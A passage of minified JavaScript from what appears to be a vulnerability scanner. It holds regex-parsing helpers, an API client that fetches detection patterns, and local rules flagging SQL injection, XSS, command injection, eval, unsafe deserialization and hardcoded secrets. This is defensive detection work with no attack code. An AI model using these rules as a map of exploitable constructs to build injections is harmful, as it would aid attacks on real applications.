0)Y=J;Object.defineProperty(X,Y,{enumerable:!0,get:function(){return Q[J]}})}:function(X,Q,J,Y){if(Y===void 0)Y=J;X[Y]=Q[J]}),Nb=Q6&&Q6.__setModuleDefault||(Object.create?function(X,Q){Object.defineProperty(X,"default",{enumerable:!0,value:Q})}:function(X,Q){X.default=Q}),wb=Q6&&Q6.__importStar||function(X){if(X&&X.__esModule)return X;var Q={};if(X!=null){for(var J in X)if(J!=="default"&&Object.prototype.hasOwnProperty.call(X,J))Db(Q,X,J)}return Nb(Q,X),Q};Object.defineProperty(Q6,"__esModule",{value:!0});Q6.tokenizeClass=Q6.strToChars=void 0;var uB=R8(),n7=wb(kJ()),Ib="@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^ ?";Q6.strToChars=(X)=>{let Q=/(\[\\b\])|(\\)?\\(?:u([A-F0-9]{4})|x([A-F0-9]{2})|c([@A-Z[\\\]^?])|([0tnvfr]))/g;return X.replace(Q,(J,Y,W,G,H,$,z)=>{if(W)return J;let U=Y?8:G?parseInt(G,16):H?parseInt(H,16):$?Ib.indexOf($):{0:0,t:9,n:10,v:11,f:12,r:13}[z],K=String.fromCharCode(U);return/[[\]{}^$.|?*+()]/.test(K)?`\\${K}`:K})};Q6.tokenizeClass=(X,Q)=>{var J,Y,W,G,H,$,z;let U=[],K,B,q=/\\(?:(w)|(d)|(s)|(W)|(D)|(S))|((?:(?:\\)(.)|([^\]\\]))-(((?:\\)])|(((?:\\)?([^\]])))))|(\])|(?:\\)?([^])/g;while((K=q.exec(X))!==null){let Z=(z=($=(H=(G=(W=(Y=(J=K[1]&&n7.words())!==null&&J!==void 0?J:K[2]&&n7.ints())!==null&&Y!==void 0?Y:K[3]&&n7.whitespace())!==null&&W!==void 0?W:K[4]&&n7.notWords())!==null&&G!==void 0?G:K[5]&&n7.notInts())!==null&&H!==void 0?H:K[6]&&n7.notWhitespace())!==null&&$!==void 0?$:K[7]&&{type:uB.types.RANGE,from:(K[8]||K[9]).charCodeAt(0),to:(B=K[10]).charCodeAt(B.length-1)})!==null&&z!==void 0?z:(B=K[16])&&{type:uB.types.CHAR,value:B.charCodeAt(0)};if(Z)U.push(Z);else return[U,q.lastIndex]}throw SyntaxError(`Invalid regular expression: /${Q}/: Unterminated character class`)}});var HH=m((r6)=>{var Cb=r6&&r6.__createBinding||(Object.create?function(X,Q,J,Y){if(Y===void 0)Y=J;Object.defineProperty(X,Y,{enumerable:!0,get:function(){return Q[J]}})}:function(X,Q,J,Y){if(Y===void 0)Y=J;X[Y]=Q[J]}),Pb=r6&&r6.__setModuleDefault||(Object.create?function(X,Q){Object.defineProperty(X,"default",{enumerable:!0,value:Q})}:function(X,Q){X.default=Q}),dB=r6&&r6.__importStar||function(X){if(X&&X.__esModule)return X;var Q={};if(X!=null){for(var J in X)if(J!=="default"&&Object.prototype.hasOwnProperty.call(X,J))Cb(Q,X,J)}return Pb(Q,X),Q};Object.defineProperty(r6,"__esModule",{value:!0});r6.tokenizer=void 0;var lB=dB(cB()),B9=R8(),lX=dB(kJ()),Sb=/^[a-zA-Z_$]$/i,Eb=/^[a-zA-Z0-9_$]$/i,pB=/\d/;r6.tokenizer=(X)=>{let Q=0,J,Y={type:B9.types.ROOT,stack:[]},W=Y,G=Y.stack,H=[],$=[],z=0,U=(B)=>{throw SyntaxError(`Invalid regular expression: /${X}/: Nothing to repeat at column ${B-1}`)},K=lB.strToChars(X);while(Q<K.length)switch(J=K[Q++]){case"\\":if(Q===K.length)throw SyntaxError(`Invalid regular expression: /${X}/: \\ at end of pattern`);switch(J=K[Q++]){case"b":G.push({type:B9.types.POSITION,value:"b"});break;case"B":G.push({type:B9.types.POSITION,value:"B"});break;case"w":G.push(lX.words());break;case"W":G.push(lX.notWords());break;case"d":G.push(lX.ints());break;case"D":G.push(lX.notInts());break;case"s":G.push(lX.whitespace());break;case"S":G.push(lX.notWhitespace());break;default:if(pB.test(J)){let B=J;while(Q<K.length&&pB.test(K[Q]))B+=K[Q++];let q=parseInt(B,10),Z={type:B9.types.REFERENCE,value:q};G.push(Z),$.push({reference:Z,stack:G,index:G.length-1})}else G.push({type:B9.types.CHAR,value:J.charCodeAt(0)})}break;case"^":G.push({type:B9.types.POSITION,value:"^"});break;case"$":G.push({type:B9.types.POSITION,value:"$"});break;case"[":{let B;if(K[Q]==="^")B=!0,Q++;else B=!1;let q=lB.tokenizeClass(K.slice(Q),X);Q+=q[1],G.push({type:B9.types.SET,set:q[0],not:B});break}case".":G.push(lX.anyChar());break;case"(":{let B={type:B9.types.GROUP,stack:[],remember:!0};if(K[Q]==="?")if(J=K[Q+1],Q+=2,J==="=")B.followedBy=!0,B.remember=!1;else if(J==="!")B.notFollowedBy=!0,B.remember=!1;else if(J==="<"){let q="";if(Sb.test(K[Q]))q+=K[Q],Q++;else throw SyntaxError(`Invalid regular expression: /${X}/: Invalid capture group name, character '${K[Q]}' after '<' at column ${Q+1}`);while(Q<K.length&&Eb.test(K[Q]))q+=K[Q],Q++;if(!q)throw SyntaxError(`Invalid regular expression: /${X}/: Invalid capture group name, character '${K[Q]}' after '<' at column ${Q+1}`);if(K[Q]!==">")throw SyntaxError(`Invalid regular expression: /${X}/: Unclosed capture group name, expected '>', found '${K[Q]}' at column ${Q+1}`);B.name=q,Q++}else if(J===":")B.remember=!1;else throw SyntaxError(`Invalid regular expression: /${X}/: Invalid group, character '${J}' after '?' at column ${Q-1}`);else z+=1;G.push(B),H.push(W),W=B,G=B.stack;break}case")":if(H.length===0)throw SyntaxError(`Invalid regular expression: /${X}/: Unmatched ) at column ${Q-1}`);W=H.pop(),G=W.options?W.options[W.options.length-1]:W.stack;break;case"|":{if(!W.options)W.options=[W.stack],delete W.stack;let B=[];W.options.push(B),G=B;break}case"{":{let B=/^(\d+)(,(\d+)?)?\}/.exec(K.slice(Q)),q,Z;if(B!==null){if(G.length===0)U(Q);q=parseInt(B[1],10),Z=B[2]?B[3]?parseInt(B[3],10):1/0:q,Q+=B[0].length,G.push({type:B9.types.REPETITION,min:q,max:Z,value:G.pop()})}else G.push({type:B9.types.CHAR,value:123});break}case"?":if(G.length===0)U(Q);G.push({type:B9.types.REPETITION,min:0,max:1,value:G.pop()});break;case"+":if(G.length===0)U(Q);G.push({type:B9.types.REPETITION,min:1,max:1/0,value:G.pop()});break;case"*":if(G.length===0)U(Q);G.push({type:B9.types.REPETITION,min:0,max:1/0,value:G.pop()});break;default:G.push({type:B9.types.CHAR,value:J.charCodeAt(0)})}if(H.length!==0)throw SyntaxError(`Invalid regular expression: /${X}/: Unterminated group`);return Tb($,z),Y};function Tb(X,Q){for(let J of X.reverse())if(Q<J.reference.value){J.reference.type=B9.types.CHAR;let Y=J.reference.value.toString();if(J.reference.value=parseInt(Y,8),!/^[0-7]+$/.test(Y)){let W=0;while(Y[W]!=="8"&&Y[W]!=="9")W+=1;if(W===0)J.reference.value=Y.charCodeAt(0),W+=1;else J.reference.value=parseInt(Y.slice(0,W),8);if(Y.length>W){let G=J.stack.splice(J.index+1);for(let H of Y.slice(W))J.stack.push({type:B9.types.CHAR,value:H.charCodeAt(0)});J.stack.push(...G)}}}}});var rB=m((A9)=>{var _b=A9&&A9.__createBinding||(Object.create?function(X,Q,J,Y){if(Y===void 0)Y=J;Object.defineProperty(X,Y,{enumerable:!0,get:function(){return Q[J]}})}:function(X,Q,J,Y){if(Y===void 0)Y=J;X[Y]=Q[J]}),kb=A9&&A9.__setModuleDefault||(Object.create?function(X,Q){Object.defineProperty(X,"default",{enumerable:!0,value:Q})}:function(X,Q){X.default=Q}),bb=A9&&A9.__importStar||function(X){if(X&&X.__esModule)return X;var Q={};if(X!=null){for(var J in X)if(J!=="default"&&Object.prototype.hasOwnProperty.call(X,J))_b(Q,X,J)}return kb(Q,X),Q};Object.defineProperty(A9,"__esModule",{value:!0});A9.NOTANYCHAR=A9.WHITESPACE=A9.WORDS=A9.INTS=void 0;var bJ=bb(kJ()),iB=R8();function vJ(X){let Q={},J=0;for(let Y of X){if(Y.type===iB.types.CHAR)Q[Y.value]=!0;if(Y.type===iB.types.RANGE)Q[`${Y.from}-${Y.to}`]=!0;J+=1}return{lookup:()=>Object.assign({},Q),len:J}}A9.INTS=vJ(bJ.ints().set);A9.WORDS=vJ(bJ.words().set);A9.WHITESPACE=vJ(bJ.whitespace().set);A9.NOTANYCHAR=vJ(bJ.anyChar().set)});var aB=m((J6)=>{var vb=J6&&J6.__createBinding||(Object.create?function(X,Q,J,Y){if(Y===void 0)Y=J;Object.defineProperty(X,Y,{enumerable:!0,get:function(){return Q[J]}})}:function(X,Q,J,Y){if(Y===void 0)Y=J;X[Y]=Q[J]}),xb=J6&&J6.__setModuleDefault||(Object.create?function(X,Q){Object.defineProperty(X,"default",{enumerable:!0,value:Q})}:function(X,Q){X.default=Q}),fb=J6&&J6.__importStar||function(X){if(X&&X.__esModule)return X;var Q={};if(X!=null){for(var J in X)if(J!=="default"&&Object.prototype.hasOwnProperty.call(X,J))vb(Q,X,J)}return xb(Q,X),Q};Object.defineProperty(J6,"__esModule",{value:!0});J6.writeSetTokens=J6.setChar=void 0;var yJ=R8(),xJ=fb(rB());function hJ(X){return X===94?"\\^":X===92?"\\\\":X===93?"\\]":X===45?"\\-":String.fromCharCode(X)}J6.setChar=hJ;function fJ(X,{lookup:Q,len:J}){if(J!==X.length)return!1;let Y=Q();for(let W of X){if(W.type===yJ.types.SET)return!1;let G=W.type===yJ.types.CHAR?W.value:`${W.from}-${W.to}`;if(Y[G])Y[G]=!1;else return!1}return!0}function nB(X,Q=!1){if(fJ(X.set,xJ.INTS))return X.not?"\\D":"\\d";if(fJ(X.set,xJ.WORDS))return X.not?"\\W":"\\w";if(X.not&&fJ(X.set,xJ.NOTANYCHAR))return".";if(fJ(X.set,xJ.WHITESPACE))return X.not?"\\S":"\\s";let J="";for(let W=0;W<X.set.length;W++){let G=X.set[W];J+=hb(G)}let Y=`${X.not?"^":""}${J}`;return Q?Y:`[${Y}]`}J6.writeSetTokens=nB;function hb(X){if(X.type===yJ.types.CHAR)return hJ(X.value);else if(X.type===yJ.types.RANGE)return`${hJ(X.from)}-${hJ(X.to)}`;return nB(X,!0)}});var zH=m((tB)=>{Object.defineProperty(tB,"__esModule",{value:!0});tB.reconstruct=void 0;var HX=R8(),$H=aB(),oB=(X)=>X.map(tB.reconstruct).join(""),sB=(X)=>{if("options"in X)return X.options.map(oB).join("|");else if("stack"in X)return oB(X.stack);else throw Error("options or stack must be Root or Group token")};tB.reconstruct=(X)=>{switch(X.type){case HX.types.ROOT:return sB(X);case HX.types.CHAR:{let Q=String.fromCharCode(X.value);return(/[[\\{}$^.|?*+()]/.test(Q)?"\\":"")+Q}case HX.types.POSITION:if(X.value==="^"||X.value==="$")return X.value;else return`\\${X.value}`;case HX.types.REFERENCE:return`\\${X.value}`;case HX.types.SET:return $H.writeSetTokens(X);case HX.types.GROUP:return`(${X.name?`?<${X.name}>`:X.remember?"":X.followedBy?"?=":X.notFollowedBy?"?!":"?:"}${sB(X)})`;case HX.types.REPETITION:{let{min:Q,max:J}=X,Y;if(Q===0&&J===1)Y="?";else if(Q===1&&J===1/0)Y="+";else if(Q===0&&J===1/0)Y="*";else if(J===1/0)Y=`{${Q},}`;else if(Q===J)Y=`{${Q}}`;else Y=`{${Q},${J}}`;return`${tB.reconstruct(X.value)}${Y}`}case HX.types.RANGE:return`${$H.setChar(X.from)}-${$H.setChar(X.to)}`;default:throw Error(`Invalid token type ${X}`)}}});var Qq=m((Y6,mJ)=>{var yb=Y6&&Y6.__createBinding||(Object.create?function(X,Q,J,Y){if(Y===void 0)Y=J;Object.defineProperty(X,Y,{enumerable:!0,get:function(){return Q[J]}})}:function(X,Q,J,Y){if(Y===void 0)Y=J;X[Y]=Q[J]}),UH=Y6&&Y6.__exportStar||function(X,Q){for(var J in X)if(J!=="default"&&!Object.prototype.hasOwnProperty.call(Q,J))yb(Q,X,J)};Object.defineProperty(Y6,"__esModule",{value:!0});Y6.types=void 0;var eB=R8();Object.defineProperty(Y6,"types",{enumerable:!0,get:function(){return eB.types}});UH(HH(),Y6);UH(zH(),Y6);var Xq=HH(),gb=zH();UH(R8(),Y6);Y6.default=Xq.tokenizer;mJ.exports=Xq.tokenizer;mJ.exports.types=eB.types;mJ.exports.reconstruct=gb.reconstruct});var Yq=m((q90,uJ)=>{var Jq=Qq(),mb=Jq.types;function KH(X,Q){if(!Q)Q={};let J=Q.limit===void 0?25:Q.limit;if(ub(X))X=X.source;else if(typeof X!=="string")X=String(X);try{X=Jq(X)}catch{return!1}let Y=0;return function W(G,H){let $,z,U;if(G.type===mb.REPETITION){if(H++,Y++,H>1)return!1;if(Y>J)return!1}if(G.options){for($=0,U=G.options.length;$<U;$++)if(z=W({stack:G.options[$]},H),!z)return!1}let K=G.stack||G.value?.stack;if(!K)return!0;for($=0;$<K.length;$++)if(z=W(K[$],H),!z)return!1;return!0}(X,0)}function ub(X){return{}.toString.call(X)==="[object RegExp]"}uJ.exports=KH;uJ.exports.default=KH;uJ.exports.safeRegex=KH});var $X=()=>{};function cb(X){return X&&typeof X==="object"&&X.__type__==="regex"&&typeof X.source==="string"&&Array.isArray(X.flags)}class cJ{apiUrl;apiKey;cache=new Map;cacheTTL;fallbackToLocal;constructor(X={}){let J=(X.apiUrl||process.env.RSOLV_API_URL||"https://api.rsolv.dev").replace(/\/$/,"");if(this.apiUrl=J.includes("/api/v1/patterns")?J:`${J}/api/v1/patterns`,this.apiKey=X.apiKey||process.env.RSOLV_API_KEY,this.cacheTTL=(X.cacheTTL||3600)*1000,this.fallbackToLocal=X.fallbackToLocal??!0,!this.apiKey)V.warn("No RSOLV API key provided - only demo patterns available");else V.debug("PatternAPIClient initialized with API key",{keyLength:this.apiKey.length,keyPrefix:this.apiKey.substring(0,10)+"...",keyFromConfig:!!X.apiKey,keyFromEnv:!X.apiKey&&!!process.env.RSOLV_API_KEY})}async fetchPatterns(X){let Q=`${X}-${this.apiKey||"demo"}`,J=this.cache.get(Q);if(J&&Date.now()-J.timestamp<this.cacheTTL)return V.info(`Using cached patterns for ${X} (${J.patterns.length} patterns)`),{patterns:J.patterns,fromCache:!0};try{let Y={"Content-Type":"application/json"};if(this.apiKey)Y["x-api-key"]=this.apiKey;let W=await fetch(`${this.apiUrl}?language=${X}&format=enhanced`,{headers:Y});if(!W.ok)throw Error(`Failed to fetch patterns: ${W.status} ${W.statusText}`);let G=await W.json(),H=G.metadata?.count||G.count||G.patterns.length;V.info(`Fetched ${H} ${X} patterns from API`);let $=G.patterns.map((z)=>this.convertToSecurityPattern(z));return this.cache.set(Q,{patterns:$,timestamp:Date.now()}),{patterns:$,fromCache:!1}}catch(Y){if(V.error(`Failed to fetch ${X} patterns from API:`,Y),this.fallbackToLocal)return V.warn(`Falling back to local patterns for ${X}`),{patterns:[],fromCache:!1};throw Y}}convertToSecurityPattern(X){let Q=this.reconstructPattern(X),J=[];if(Q.regex){let G=Q.regex;if(typeof G==="string")J=[G];else if(Array.isArray(G))J=G}else if(Array.isArray(Q.regex_patterns))J=Q.regex_patterns;else if(Array.isArray(Q.patterns))J=Q.patterns;else if(Q.patterns&&typeof Q.patterns==="object"&&"regex"in Q.patterns&&Array.isArray(Q.patterns.regex))J=Q.patterns.regex;else V.warn(`No regex patterns found for ${Q.id}`),J=[];let Y=J.map((G)=>{try{if(G instanceof RegExp)return G;if(typeof G==="string"){let H=G.match(/^\/(.*)\/([gimsuvy]*)$/);if(H)return new RegExp(H[1],H[2]);return new RegExp(G,"im")}return V.warn(`Unexpected pattern type for ${Q.id}:`,G),null}catch(H){return V.warn(`Failed to compile regex for pattern ${Q.id}: ${G}`),V.error(String(H)),null}}).filter(Boolean),W=Q.context_rules||void 0;return{id:Q.id,name:Q.name,type:this.mapVulnerabilityType(Q.type),severity:Q.severity,description:Q.description,patterns:{regex:Y,ast:Q.ast_rules?[JSON.stringify(Q.ast_rules)]:void 0},languages:Q.languages,cweId:Q.cwe_id||Q.cweId||"",owaspCategory:Q.owasp_category||Q.owaspCategory||"",remediation:Q.recommendation,examples:{vulnerable:Q.test_cases?.vulnerable?.[0]||Q.testCases?.vulnerable?.[0]||"",secure:Q.test_cases?.safe?.[0]||Q.testCases?.safe?.[0]||""},astRules:Q.ast_rules,contextRules:W,confidenceRules:Q.confidence_rules,minConfidence:Q.min_confidence}}mapVulnerabilityType(X){return{sql_injection:"sql_injection",xss:"xss",command_injection:"command_injection",code_injection:"code_injection",path_traversal:"path_traversal",xxe:"xml_external_entities",ssrf:"server_side_request_forgery",insecure_deserialization:"insecure_deserialization",deserialization:"insecure_deserialization",prototype_pollution:"prototype_pollution",weak_crypto:"weak_cryptography",crypto:"weak_cryptography",cryptographic_failure:"weak_cryptography",hardcoded_secret:"hardcoded_secrets",insecure_random:"weak_cryptography",open_redirect:"open_redirect",ldap_injection:"ldap_injection",xpath_injection:"xpath_injection",nosql_injection:"nosql_injection",rce:"command_injection",dos:"denial_of_service",denial_of_service:"denial_of_service",timing_attack:"information_disclosure",csrf:"cross_site_request_forgery",jwt:"broken_authentication",insecure_jwt:"broken_authentication",authentication:"broken_authentication",broken_authentication:"broken_authentication",debug:"information_disclosure",debug_mode:"debug_mode",information_disclosure:"information_disclosure",cve:"vulnerable_components",file_upload:"path_traversal",file_inclusion:"path_traversal",input_validation:"xss",session_management:"cross_site_request_forgery",resource_exhaustion:"denial_of_service",template_injection:"template_injection",broken_access_control:"broken_access_control",authorization:"broken_access_control",security_misconfiguration:"security_misconfiguration",misconfiguration:"security_misconfiguration",clickjacking:"security_misconfiguration",sensitive_data_exposure:"sensitive_data_exposure",mass_assignment:"mass_assignment",logging:"insufficient_logging",log_injection:"log_injection",injection:"sql_injection"}[X]||"improper_input_validation"}clearCache(){this.cache.clear(),V.info("Pattern cache cleared")}convertRegexFlags(X){let Q={i:"i",m:"m",s:"s",u:"u",g:"g",y:"y",d:"d"};return X.map((J)=>Q[J]||"").filter(Boolean).join("")}reconstructRegex(X){let Q=this.convertRegexFlags(X.flags);return new RegExp(X.source,Q)}reconstructPattern(X){if(X===null||X===void 0)return X;if(cb(X))return this.reconstructRegex(X);if(Array.isArray(X))return X.map((Q)=>this.reconstructPattern(Q));if(typeof X==="object"){let Q={};for(let[J,Y]of Object.entries(X))Q[J]=this.reconstructPattern(Y);return Q}return X}async checkHealth(){try{let X=await fetch(`${this.apiUrl}/health`,{method:"GET",headers:{"User-Agent":"RSOLV-Action/1.0"}});if(X.ok)return{status:"healthy"};else return{status:"unhealthy",message:`API returned status ${X.status}`}}catch(X){return{status:"unhealthy",message:X instanceof Error?X.message:"Unknown error"}}}}var VH=$1(()=>{y1();$X()});function o7(X){let Q=Array.isArray(X.language)?X.language:[X.language];return{id:X.id,name:X.name,type:"code_injection",severity:"critical",description:X.description||"Use of eval() or dynamic code execution with user input",patterns:{regex:X.patterns},languages:Q,cweId:L4.CODE_INJECTION,owaspCategory:D4.INJECTION,remediation:X.remediation||"Avoid eval(), use safe alternatives",examples:{vulnerable:"",secure:""}}}function BH(X){return{id:X.id,name:X.name,type:"insecure_deserialization",severity:"high",description:X.description||"Unsafe deserialization of untrusted data",patterns:{regex:X.patterns},languages:[X.language],cweId:L4.INSECURE_DESERIALIZATION,owaspCategory:D4.SOFTWARE_DATA_INTEGRITY,remediation:X.remediation||"Use safe serialization formats like JSON",examples:{vulnerable:"",secure:""}}}function Wq(X){return{id:X.id,name:X.name,type:"prototype_pollution",severity:"high",description:X.description||"Unsafe assignment to object properties that can pollute the prototype chain",patterns:{regex:X.patterns},languages:["javascript","typescript"],cweId:L4.PROTOTYPE_POLLUTION,owaspCategory:D4.SOFTWARE_DATA_INTEGRITY,remediation:X.remediation||"Use Object.create(null), validate keys against whitelist, or use Map",examples:{vulnerable:"",secure:""}}}var L4,D4;var Gq=$1(()=>{$X();L4={CODE_INJECTION:"CWE-94",INSECURE_DESERIALIZATION:"CWE-502",PROTOTYPE_POLLUTION:"CWE-1321",COMMAND_INJECTION:"CWE-78",SQL_INJECTION:"CWE-89",XSS:"CWE-79",PATH_TRAVERSAL:"CWE-22",LOG_INJECTION:"CWE-117",CRLF_INJECTION:"CWE-93",NOSQL_INJECTION:"CWE-943"},D4={INJECTION:"A03:2021",BROKEN_AUTH:"A07:2021",INSECURE_DESIGN:"A04:2021",VULNERABLE_COMPONENTS:"A06:2021",SECURITY_MISCONFIGURATION:"A05:2021",IDENTIFICATION_FAILURES:"A07:2021",SOFTWARE_DATA_INTEGRITY:"A08:2021",LOGGING_MONITORING:"A09:2021",BROKEN_ACCESS_CONTROL:"A01:2021"}});function lJ(){return[{id:"basic-sql-injection",name:"Basic SQL Injection",type:"sql_injection",severity:"high",description:"Potential SQL injection via string concatenation",patterns:{regex:[/["'`].*?(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER).*?["'`]\s*\+/gi,/execute\s*\(\s*['"`].*\+/gi]},languages:["javascript","typescript"],cweId:L4.SQL_INJECTION,owaspCategory:D4.INJECTION,remediation:"Use parameterized queries or prepared statements",examples:{vulnerable:"",secure:""}},{id:"basic-xss",name:"Basic Cross-Site Scripting",type:"xss",severity:"high",description:"Potential XSS via innerHTML",patterns:{regex:[/innerHTML\s*=\s*[^'"`;]*(userInput|userContent|req\.|request\.)/gi,/document\.write\s*\(/gi]},languages:["javascript","typescript"],cweId:"CWE-79",owaspCategory:"A03:2021",remediation:"Use textContent or proper encoding",examples:{vulnerable:"",secure:""}},{id:"basic-command-injection",name:"Basic Command Injection",type:"command_injection",severity:"critical",description:"Potential command injection",patterns:{regex:[/exec\s*\(\s*['"`].*\+/gi,/system\s*\(\s*['"`].*\+/gi]},languages:["javascript","python","ruby"],cweId:"CWE-78",owaspCategory:"A03:2021",remediation:"Validate and sanitize all user input",examples:{vulnerable:"",secure:""}},{id:"basic-path-traversal",name:"Basic Path Traversal",type:"path_traversal",severity:"high",description:"Potential path traversal vulnerability",patterns:{regex:[/readFile\s*\([^)]*\.\.\/[^)]*\)/gi,/path\.join\s*\([^)]*req\./gi]},languages:["javascript","typescript"],cweId:"CWE-22",owaspCategory:"A01:2021",remediation:"Validate and sanitize file paths",examples:{vulnerable:"",secure:""}},o7({id:"js-eval",name:"JavaScript Eval Usage",language:["javascript","typescript"],patterns:[/eval\s*\(/gi,/Function\s*\(/gi,/setTimeout\s*\([^,]*,[^,)]*\)/gi],remediation:"Avoid eval(), use JSON.parse() or safer alternatives"}),{id:"python-sql-injection",name:"Python SQL Injection",type:"sql_injection",severity:"high",description:"SQL injection via string formatting or concatenation",patterns:{regex:[/\.raw\s*\(/gi,/execute\s*\(\s*["'].*%[s|d].*["']\s*%/gi,/execute\s*\(\s*["'].*\+.*["']\s*\)/gi,/cursor\.execute\s*\(\s*f["']/gi]},languages:["python"],cweId:"CWE-89",owaspCategory:"A03:2021",remediation:"Use parameterized queries with ? or %s placeholders",examples:{vulnerable:"",secure:""}},o7({id:"python-eval",name:"Python Eval Usage",language:"python",patterns:[/eval\s*\(/gi,/exec\s*\(/gi],description:"Use of eval() with user input",remediation:"Avoid eval(), use ast.literal_eval() for safe evaluation"}),BH({id:"python-pickle",name:"Insecure Deserialization",language:"python",patterns:[/pickle\.loads?\s*\(/gi,/cPickle\.loads?\s*\(/gi],description:"Use of pickle with untrusted data",remediation:"Use JSON or other safe serialization formats"}),{id:"ruby-sql-injection",name:"Ruby SQL Injection",type:"sql_injection",severity:"high",description:"SQL injection via string interpolation",patterns:{regex:[/\.where\s*\(\s*["'].*#\{.*\}.*["']/gi,/find_by_sql\s*\(\s*["'].*#\{.*\}.*["']/gi,/execute\s*\(\s*["'].*#\{.*\}.*["']/gi]},languages:["ruby"],cweId:"CWE-89",owaspCategory:"A03:2021",remediation:"Use parameterized queries or ActiveRecord query interface",examples:{vulnerable:"",secure:""}},o7({id:"ruby-eval",name:"Ruby Eval Usage",language:"ruby",patterns:[/eval\s*\(/gi,/instance_eval\s*\(/gi],description:"Use of eval with user input",remediation:"Avoid eval, use safe alternatives"}),BH({id:"ruby-yaml",name:"YAML Deserialization",language:"ruby",patterns:[/YAML\.load\s*\(/gi,/Psych\.load\s*\(/gi],description:"Unsafe YAML loading",remediation:"Use YAML.safe_load instead"}),{id:"java-sql-injection",name:"Java SQL Injection",type:"sql_injection",severity:"high",description:"SQL injection via string concatenation",patterns:{regex:[/\.?execute(?:Query|Update)?\s*\([^)]*\+[^)]*\)/gi,/String\s+\w*(?:query|sql|statement)\w*\s*=\s*["'].*(?:SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER).*["']\s*\+/gi,/["'].*(?:SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|FROM|WHERE|JOIN|UNION|ORDER BY|GROUP BY).*["']\s*\+/gi,/(?:StringBuilder|StringBuffer)\s*\(?\s*["'].*(?:SELECT|INSERT|UPDATE|DELETE).*["']\s*\)?.*\.append\s*\(/gi,/String\.format\s*\(\s*["'].*(?:SELECT|INSERT|UPDATE|DELETE).*%[sd].*["']/gi,/prepareStatement\s*\([^)]*\+[^)]*\)/gi,/jdbcTemplate\.(?:query|update|execute)\s*\([^)]*\+[^)]*\)/gi]},languages:["java"],cweId:"CWE-89",owaspCategory:"A03:2021",remediation:"Use PreparedStatement with parameters",examples:{vulnerable:"",secure:""}},{id:"java-xxe",name:"XML External Entity",type:"xml_external_entities",severity:"high",description:"XML parser vulnerable to XXE",patterns:{regex:[/DocumentBuilderFactory\.newInstance\s*\(\s*\)/gi,/SAXParserFactory\.newInstance\s*\(\s*\)/gi]},languages:["java"],cweId:"CWE-611",owaspCategory:"A05:2021",remediation:"Disable external entities and DTD processing",examples:{vulnerable:"",secure:""}},{id:"php-sql-injection",name:"PHP SQL Injection",type:"sql_injection",severity:"high",description:"SQL injection via string concatenation or interpolation",patterns:{regex:[/["'].*(?:SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER)[^"']*\$\w+/gi,/["'].*(?:SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER).*\$(?:_GET|_POST|_REQUEST)\[/gi,/["'].*(?:SELECT|INSERT|UPDATE|DELETE).*["']\s*\.\s*\$(?:_GET|_POST|_REQUEST)/gi,/mysql_query\s*\([^)]*\.\s*\$/gi,/mysqli_query\s*\([^,)]*,[^)]*\.\s*\$/gi,/->exec\s*\([^)]*\.\s*\$/gi,/\$(?:query|sql)\s*=\s*["'].*(?:SELECT|INSERT|UPDATE|DELETE).*["']\s*\.\s*\$/gi,/["'].*(?:SELECT|INSERT|UPDATE|DELETE).*\{\$(?:_GET|_POST|_REQUEST)/gi]},languages:["php"],cweId:"CWE-89",owaspCategory:"A03:2021",remediation:"Use prepared statements with PDO or mysqli",examples:{vulnerable:"",secure:""}},o7({id:"php-eval",name:"PHP Eval Usage",language:"php",patterns:[/eval\s*\(/gi,/assert\s*\(/gi],remediation:"Avoid eval(), use safe alternatives"}),{id:"php-file-inclusion",name:"File Inclusion",type:"path_traversal",severity:"high",description:"Dynamic file inclusion",patterns:{regex:[/include\s*\(\s*\$_(?:GET|POST|REQUEST)/gi,/require\s*\(\s*\$_(?:GET|POST|REQUEST)/gi]},languages:["php"],cweId:"CWE-98",owaspCategory:"A03:2021",remediation:"Validate and whitelist file paths",examples:{vulnerable:"",secure:""}},o7({id:"elixir-code-eval",name:"Elixir Code Evaluation",language:"elixir",patterns:[/Code\.eval_string\s*\(/gi,/Code\.eval_quoted\s*\(/gi],description:"Dynamic code evaluation",remediation:"Avoid dynamic code evaluation"}),{id:"elixir-atom-dos",name:"Atom DoS",type:"denial_of_service",severity:"medium",description:"Creating atoms from user input",patterns:{regex:[/String\.to_atom\s*\(/gi,/binary_to_atom\s*\(/gi]},languages:["elixir"],cweId:"CWE-400",owaspCategory:"A06:2021",remediation:"Use String.to_existing_atom instead",examples:{vulnerable:"",secure:""}},{id:"hardcoded-secret",name:"Hardcoded Secret",type:"hardcoded_secrets",severity:"high",description:"Hardcoded password or API key",patterns:{regex:[/password\s*=\s*["'][^"']{8,}["']/gi,/api_key\s*=\s*["'][^"']{20,}["']/gi]},languages:["javascript","typescript","python","ruby","java","php","elixir"],cweId:"CWE-798",owaspCategory:"A07:2021",remediation:"Use environment variables or secure key management",examples:{vulnerable:"",secure:""}},{id:"weak-crypto",name:"Weak Cryptography",type:"weak_cryptography",severity:"medium",description:"Use of weak cryptographic algorithms",patterns:{regex:[/MD5\s*\(/gi,/SHA1\s*\(/gi]},languages:["javascript","typescript","python","ruby","java","php"],cweId:"CWE-327",owaspCategory:"A02:2021",remediation:"Use SHA-256 or stronger algorithms",examples:{vulnerable:"",secure:""}},{id:"jwt-none-algorithm",name:"JWT None Algorithm",type:"broken_authentication",severity:"critical",description:"JWT allowing none algorithm",patterns:{regex:[/algorithm\s*:\s*["']none["']/gi,/verify\s*:\s*false/gi]},languages:["javascript","typescript","python","ruby"],cweId:"CWE-347",owaspCategory:"A02:2021",remediation:"Always verify JWT signatures",examples:{vulnerable:"",secure:""}},{id:"open-redirect",name:"Open Redirect",type:"open_redirect",severity:"medium",description:"Unvalidated redirect",patterns:{regex:[/redirect\s*\(\s*req\./gi,/location\.href\s*=\s*req\./gi]},languages:["javascript","typescript"],cweId:"CWE-601",owaspCategory:"A03:2021",remediation:"Validate redirect URLs against whitelist",examples:{vulnerable:"",secure:""}},{id:"nosql-injection",name:"NoSQL Injection",type:"nosql_injection",severity:"high",description:"MongoDB injection vulnerability",patterns:{regex:[/\$where\s*:/gi,/find\s*\(\s*{[^}]*\$ne\s*:/gi]},languages:["javascript","typescript"],cweId:"CWE-943",owaspCategory:"A03:2021",remediation:"Sanitize user input and use parameterized 